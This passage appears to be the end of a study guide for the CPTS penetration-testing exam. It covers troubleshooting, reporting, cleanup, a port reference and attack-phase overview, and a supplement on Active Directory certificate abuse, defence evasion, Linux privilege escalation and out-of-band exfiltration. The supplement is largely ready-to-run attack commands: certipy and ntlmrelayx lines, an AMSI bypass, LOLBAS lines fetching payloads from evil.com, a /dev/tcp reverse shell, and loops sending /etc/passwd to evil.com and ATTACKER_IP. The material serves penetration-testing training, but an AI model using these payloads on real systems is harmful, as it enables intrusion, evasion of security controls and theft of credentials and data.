4. **Fallback Vectors:** If `psexec` fails, try `wmiexec`. If `wget` fails, try `certutil` or `bitsadmin`
5. **Password Spraying:** Use harvested data to spray with common passwords
6. **Responder:** Keep it running — hashes may come in while you work other vectors
7. **Check for Web Shells:** Previous pentesters may have left backdoors in `/var/www/html/` or `C:\inetpub\wwwroot\`
8. **Check Mapped Drives:** `net use` on Windows — mapped drives may lead directly to DC resources
9. **Try RDP Session Hijacking:** `query user` → `tscon <ID> /dest:<session>` to hijack active sessions
10. **Review All Credentials:** Apply pattern analysis — if `Summer2023!` works, try `Winter2024!`

---

## 17.2 Documentation Standards

### Screenshot Requirements
Every critical step must be documented with screenshots that include:
- `whoami` — current user context
- `hostname` — machine identification
- `ipconfig`/`ifconfig` — network context

### Reporting Focus
Focus on **business impact**, not just technical findings:
- Bad: "Found SQL injection on login page"
- Good: "Attacker can extract entire customer database, including PII and payment card data, via SQL injection on the login page"

## 17.3 Cleanup

```bash
# Remove uploaded tools from target
rm /tmp/linpeas.sh
rm /tmp/createbackup.elf
rm /var/www/html/shell.php

# Windows cleanup
del C:\Users\Public\nc.exe
del C:\Temp\backupscript.exe
```

## 17.4 Organized File Structure

Maintain clean output organization:
```
target_name/
├── nmap/
│   ├── allports.nmap
│   ├── detailed.nmap
│   └── udp.nmap
├── scans/
│   ├── discovery.nmap
│   └── quick.nmap
├── exploits/
│   ├── payload.exe
│   └── shell.php
├── loot/
│   ├── hashes/
│   ├── credentials/
│   └── extracted_data/
├── notes/
└── screenshots/
```

---

# Appendix A: Quick Reference — Common Ports & Services

| Port | Service | Key Actions |
|------|---------|-------------|
| 20/21 | FTP | Anonymous login, brute force, upload/download |
| 22 | SSH | Key auth, port forwarding, banner grab, audit |
| 25 | SMTP | VRFY user enum, open relay check |
| 53 | DNS | Zone transfer, subdomain brute force, cache poisoning, takeover |
| 80/443 | HTTP/S | Dir brute force, vHost enum, fingerprint, LFI, SQLi, RCE |
| 88 | Kerberos | AS-REP roasting, Kerberoasting, user enum, PtT, OverPass-the-Hash |
| 110 | POP3 | Mail enumeration, credential hunting |
| 111 | RPC/NFS | showmount, mount shares |
| 135 | WMI/RPC | rpcclient enum, wmiexec |
| 139/445 | SMB | Share enum, null session, RID cycling, CME, NTLM relay, PtH |
| 143 | IMAP | Mail enumeration, credential hunting |
| 161 | SNMP | Community string brute, snmpwalk |
| 389 | LDAP | Anonymous bind, windapsearch, bloodhound, PassTheCert |
| 443 | HTTPS | Same as 80 + SSL/TLS testing |
| 464 | Kerberos (kpasswd) | Password changes |
| 593 | HTTP RPC | WMI/RPC enumeration |
| 623 | IPMI | Hash dumping, default creds, BMC access |
| 636 | LDAPS | LDAP over SSL, PassTheCert |
| 873 | Rsync | Share enumeration, file sync |
| 1433 | MSSQL | xp_cmdshell, nmap scripts, impacket, xp_dirtree hash steal, linked server abuse |
| 1521 | Oracle | ODAT, SID brute, sqlplus |
| 2049 | NFS | Mount shares, root squashing bypass |
| 3306 | MySQL | Empty password check, data extraction |
| 3389 | RDP | xfreerdp, credential reuse, SocksOverRDP, session hijacking, PtH |
| 5985/5986 | WinRM | evil-winrm, PowerShell remoting, PtH |
| 993 | IMAPS | Encrypted IMAP |
| 995 | POP3S | Encrypted POP3 |

---

# Appendix B: The Complete Attack Flow Summary

```
┌─────────────────────────────────────────────────────────────────┐
│                    PHASE 1: PREPARATION                          │
│  Workspace setup → tmux → variables → tool installation         │
└────────────────────────┬────────────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│              PHASE 2: EXTERNAL RECONNAISSANCE                    │
│  WHOIS → DNS → Subdomains → Cert Transparency → OSINT → Creds  │
└────────────────────────┬────────────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│             PHASE 3: NETWORK ENUMERATION                         │
│  Host discovery → Port scan (full TCP + UDP) → Service detect   │
└────────────────────────┬────────────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│           PHASE 4: SERVICE FOOTPRINTING                          │
│  FTP → SSH → SMB → NFS → DNS → SMTP → SNMP → DBs → RDP → WinRM │
└────────────────────────┬────────────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│             PHASE 5: WEB ENUMERATION                             │
│  Fingerprint → Dir brute force → vHosts → LFI → SQLi → RCE      │
└────────────────────────┬────────────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│             PHASE 6: INITIAL ACCESS                              │
│  Public exploits → MSFVenom payloads → Web shells → Shells      │
└────────────────────────┬────────────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│          PHASE 7: POST-EXPLOITATION                              │
│  TTY stabilization → File transfers → Enumeration scripts       │
└────────────────────────┬────────────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│       PHASE 8: ACTIVE DIRECTORY ATTACKS                          │
│  Responder → Password spray → Kerberoasting → BloodHound → CME  │
└────────────────────────┬────────────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│          PHASE 9: PIVOTING & TUNNELING                           │
│  SSH → Chisel → Ligolo-ng → Socat → dnscat2 → ICMP → Netsh     │
└────────────────────────┬────────────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│         PHASE 10: PRIVILEGE ESCALATION                           │
│  Linux: sudo/SUID/cron → Windows: Tokens/Services/LSASS/LAPS   │
└────────────────────────┬────────────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│       PHASE 11: LATERAL MOVEMENT & DOMAIN DOMINANCE              │
│  Pass-the-Hash → Pass-the-Ticket → DCSync → ACL abuse           │
│  + OverPass-the-Hash + Pass-the-Certificate + Shadow Credentials│
│  + NTDS.dit Extraction + DCC2 Understanding + ESC8 → DCSync     │
└────────────────────────┬────────────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│            PHASE 12: PASSWORD CRACKING                            │
│  John (rules, incremental) → Hashcat (modes, rules, masks)      │
│  + Custom Wordlists (CeWL, CUPP, username-anarchy)               │
│  + Protected Files (ZIP, PDF, SSH, KeePass, 7z)                  │
└────────────────────────┬────────────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│         PHASE 13: CREDENTIAL HUNTING                             │
│  Linux: Mimipenguin, LaZagne, KeyTab, ccache, Linikatz          │
│  Windows: LSASS CLI, CredManager, DPAPI, Network Shares         │
│  Network: tcpdump, Wireshark cleartext protocol extraction       │
└────────────────────────┬────────────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│       PHASE 14: SERVICE ADVANCED ATTACKS                         │
│  DNS Cache Poison → Subdomain Takeover → FTP Bounce → RDP Hijack│
│  MSSQL Linked Server Chains → O365spray → Open Relay Phishing   │
└────────────────────────┬────────────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│         PHASE 15: METASPLOIT ADVANCED                            │
│  Database integration → Local exploit suggester → Plugin mgmt   │
│  Payload architecture → Encoder limits → AV evasion techniques  │
│  Session/job management → setg global targeting                 │
└────────────────────────┬────────────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│         PHASE 16: NMAP IDS/FIREWALL EVASION                      │
│  Fragmentation → Decoys → Timing → Source port manipulation     │
│  Bad sum → Data length → TTL manipulation                        │
└────────────────────────┬────────────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│              PHASE 17: REPORTING & CLEANUP                       │
│  Document → Screenshot → Impact → Cleanup → Deliver             │
│  "I'm Stuck" Recovery Loop (10-step checklist)                   │
└─────────────────────────────────────────────────────────────────┘
```

---

# Appendix C: Essential Resources

| Resource | URL |
|----------|-----|
| GTFOBins (Linux PrivEsc) | https://gtfobins.github.io/ |
| LOLBAS (Windows LOL) | https://lolbas-project.github.io/ |
| HackTricks | https://book.hacktricks.xyz/ |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| Reverse Shell Cheat Sheet | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md |
| Hashcat Example Hashes | https://hashcat.net/wiki/doku.php?id=example_hashes |
| Chisel Cheatsheet | https://0xdf.gitlab.io/cheatsheets/chisel |
| tmux Cheatsheet | https://tmuxcheatsheet.com/ |
| IppSec CPTS Prep Playlist | https://www.youtube.com/playlist?list=PLidcsTyj9JXItWpbRtTg6aDEj10_F17x5 |
| WADComs (Windows AD Commands) | https://wadcoms.github.io/ |
| BloodHound | https://github.com/BloodHoundAD/BloodHound |
| Impacket | https://github.com/SecureAuthCorp/impacket |
| Mimikatz | https://github.com/gentilkiwi/mimikatz |
| Rubeus | https://github.com/GhostPack/Rubeus |
| pywhisker | https://github.com/ShutdownRepo/pywhisker |
| PKINITtools | https://github.com/dirkjanm/PKINITtools |
| Responder | https://github.com/lgandx/Responder |
| NetExec (CrackMapExec fork) | https://github.com/Pennyw0rth/NetExec |
| Snaffler | https://github.com/SnaffCon/Snaffler |
| Mimipenguin | https://github.com/huntergregal/mimipenguin |
| LaZagne | https://github.com/AlessandroZ/LaZagne |
| Firefox Decrypt | https://github.com/unode/firefox_decrypt |
| KeyTabExtract | https://github.com/zyn3rgy/KeyTabExtract |
| Linikatz | https://github.com/CiscoCXSecurity/linikatz |
| can-i-take-over-xyz | https://github.com/EdOverflow/can-i-take-over-xyz |
| RevShells | https://www.revshells.com/ |
| Username Anarchy | https://github.com/urbanadventurer/username-anarchy |

---

> **"Enumeration is everything. The more you enumerate, the easier the exploitation becomes."**
>
> *"Leave no stone unturned. Every answer leads to a new question. Every question leads to a new attack surface."*


---

# SUPPLEMENTARY: AD CS, Evasion, Deep Linux, OOB & Evidence Checklist

## AD CS (Active Directory Certificate Services) — ESC1 through ESC8

**Detection:** Certificate Authority role detected on domain controller, ADCS Web Enrollment on port 80/443, or `certipy find` reveals vulnerable templates.

### ESC1 — Misconfigured Certificate Template
Template allows `ENROLLEE_SUPPLIES_SUBJECT` + has Client Authentication EKU.
```bash
certipy req -ca 'CA_NAME' -template 'VULN_TEMPLATE' -upn Administrator@domain -dc-ip DC
# Get certificate as ANY user → authenticate as DA
```

### ESC2 — Any Purpose EKU
Template has "Any Purpose" EKU → can request certificate for ANY purpose (broader than ESC1).

### ESC3 — Enrollment Agent Template
Template has Certificate Request Agent EKU → request certificate ON BEHALF OF another user.

### ESC4 — Vulnerable Template Access Control
User has Write/Owner permissions on template → modify it to enable ESC1.
```bash
certipy template -user user@dom -pass pass -dc-ip DC -template 'VULN_TEMPLATE' -save-old
# Modify → enable ENROLLEE_SUPPLIES_SUBJECT → exploit as ESC1
```

### ESC5 — Vulnerable PKI Object ACLs
Generic misconfiguration in AD CS objects → `certipy find -vulnerable`

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag
CA flag allows SANs in ANY request.
```bash
certipy find -u user@dom -p pass -dc-ip DC
# Request with -upn Administrator@domain → get DA cert
```

### ESC7 — Vulnerable CA Access Control
User has Manage CA permissions.
```bash
certipy ca -u user@dom -p pass -dc-ip DC -ca 'CA_NAME' -add-officer 'user'
# Enable ESC6 flag → request certificate as DA
```

### ESC8 — NTLM Relay to AD CS HTTP Endpoints
```bash
impacket-ntlmrelayx -t http://CA/certsrv/ -smb2support --adcs
# Coerce auth via PetitPotam/PrinterBug/xp_dirtree → get certificate
```

### Certificate Authentication
```bash
certipy auth -pfx user.pfx -dc-ip DC_IP -domain DOMAIN
# Convert for Rubeus:
certipy pfx -in user.pfx -nocert -out user.kirbi
Rubeus.exe asktgt /user:admin /certificate:user.kirbi /ptt
```

---

## Modern Evasion & AMSI — Strategy for Failure

### Defender Status Check
```powershell
Get-MpComputerStatus | Select RealTimeProtectionEnabled, AntivirusEnabled
whoami /priv  # SeDebugPrivilege, SeImpersonatePrivilege?
```

### LOLBAS Execution Branch
| Binary | Purpose | Example |
|--------|---------|---------|
| `mshta.exe` | HTA/JavaScript execution | `mshta.exe javascript:a=GetObject("script:https://evil.com/payload.sct").Exec();` |
| `rundll32.exe` | DLL export execution | `rundll32.exe \evil.com\share\payload.dll,EntryPoint` |
| `InstallUtil.exe` | .NET assembly (bypasses AppLocker) | `InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe` |
| `regsvr32.exe` | COM scriptlet execution | `regsvr32.exe /s /n /u /i:https://evil.com/payload.sct scrobj.dll` |
| `certutil.exe` | Download + decode | `certutil -urlcache -split -f URL && certutil -decode payload.b64 payload.exe` |
| `forfiles.exe` | Command iteration | `forfiles /p C:\Windows\System32 /m cmd.exe /c "payload"` |
| `cmstp.exe` | INF file execution | `cmstp.exe /ni /s payload.inf` |

### PowerShell CLM Bypass
```powershell
# Check if constrained: $ExecutionContext.SessionState.LanguageMode
# If CLM: Use InstallUtil, csc.exe, or Python/Ruby instead
```

### AMSI Bypass
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Or: Use compiled C# binaries (no AMSI scan) or unmanaged code (Meterpreter)
```

### WSL Escape
```cmd
wsl --list
# WSL traffic NOT parsed by Windows Firewall or Defender
```

---

## Deep Linux Internals — Advanced PrivEsc

### Shared Object (.so) Hijacking
```bash
# Check for missing .so files
ldd /path/to/binary | grep "not found"

# Check for writable .so files
for lib in $(ldd /path/to/binary | awk '{print $3}'); do
  test -w "$lib" && echo "$lib is WRITABLE"
done

# Compile malicious .so
gcc -shared -o libevil.so -fPIC -Wl,-soname,libevil.so evil.c
// evil.c: __attribute__((constructor)) void init() { setuid(0); system("/bin/bash"); }
```

### Python Library Hijacking
```bash
# Check Python paths
python3 -c "import sys; print('\n'.join(sys.path))"
# Look for writable directories → place malicious module.py
# Check PYTHONPATH: echo $PYTHONPATH
```

### Capabilities Abuse — OFTEN THE INTENDED PATH
```bash
getcap -r / 2>/dev/null
```
| Capability | Abuse |
|-----------|-------|
| `cap_setuid+ep` | `python -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `cap_dac_read_search+ep` | Read ANY file (including /etc/shadow) |
| `cap_net_raw+ep` | Packet capture, ARP spoofing |
| `cap_sys_admin+ep` | Mount filesystems, Docker escape |
| `cap_fowner+ep` | Change file ownership, bypass permissions |
| `cap_chown+ep` | Change file ownership |
| `cap_setfcap+ep` | Set file capabilities → escalate |
| `cap_sys_ptrace+ep` | Ptrace processes, inject code |
| `cap_dac_override+ep` | Bypass file permission checks |

### Writable Systemd Services
```bash
find /etc/systemd /lib/systemd /usr/lib/systemd -writable -name "*.service" 2>/dev/null
# Add ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
# Trigger: systemctl daemon-reload && systemctl start service
```

### Docker/Container Escape
```bash
cat /proc/1/cgroup | grep docker           # In container?
ls -la /var/run/docker.sock                 # Socket accessible?
# If socket: docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
```

---

## OOB (Out-of-Band) Data Exfiltration — Blind Command Injection

### DNS Exfiltration
```bash
# Encode + send
hex=$(cat /etc/passwd | xxd -p | tr -d '\n')
for ((i=0; i<${#hex}; i+=50)); do chunk=${hex:i:50}; dig "$chunk.evil.com"; done
# Capture: dnscat2 server or nc -lvnp 53
```

### ICMP Exfiltration
```bash
data=$(cat /etc/passwd | base64 | tr -d '\n')
for ((i=0; i<${#data}; i+=20)); do ping -p "${data:i:20}" ATTACKER_IP; done
# Capture: tcpdump -i tun0 -w capture.pcap → Wireshark
```

### HTTP/HTTPS Exfiltration
```bash
curl -X POST http://ATTACKER/collect -d "$(cat /etc/passwd | base64)"
# Attacker: python3 -m http.server 80
```

### Timing-Based Blind Extraction
```bash
# Boolean: if [ $(whoami) = "root" ]; then sleep 5; fi
# Character-by-character:
for c in {a..z}; do if [ "$(whoami | cut -c1)" = "$c" ]; then sleep 5; fi; done
```

### Proof of Concept (no shell needed)
- Ping-based: Inject command that pings YOUR IP
- DNS-based: Inject nslookup YOUR_IP
- HTTP-based: Inject curl http://YOUR_IP
- Time-based: Inject sleep 10

---

## CPTS Evidence Checklist — Reporting Proof of Concept

**FOR EVERY compromised host (incomplete proof = FAIL):**

### REQUIRED Evidence
1. **whoami && hostname && ipconfig/all** — Screenshot MUST show username, hostname, IP config
2. **flag.txt content AND full file path** — `cat /path/to/flag.txt && echo "---" && pwd`
3. **Screenshot of EXACT exploit command** — Terminal showing: typed → executed → result
4. **Privilege level achieved** — Linux: `id && whoami`, Windows: `whoami && whoami /priv && whoami /groups`
5. **Network position** — `ip addr` / `ipconfig` showing all interfaces

### Report Structure (per host)
- **Executive Summary:** What was compromised, business impact
- **Technical Details:** Step-by-step reproduction (prerequisites → exploitation → result → proof)
- **Remediation:** How to fix the vulnerability
- **Risk Rating:** CVSS score + business context

### Exam-Specific Tips
- Take screenshots EARLY — shells can die during exam
- Save ALL terminal output to log files (`script`, `tee`, tmux logging)
- Document the FULL attack path, not just the final step
- Show HOW you found the vulnerability, not just that it exists
- Business impact > technical details in executive summary


---

*Document Version 2.0 — Revised April 2026*
*Expanded from 12 to 17 phases with 37 gap fixes applied.*
*Synthesized from CPTS Notes repository covering: Preparation, Footprinting, Web Enumeration, File Transfers, Shells & Payloads, Metasploit, Password Attacks, Attacking Common Services, Active Directory Attacks (including AD CS/ESC8/Shadow Credentials), Pivoting & Tunneling, Privilege Escalation, Credential Hunting, Password Cracking, and Reporting.*
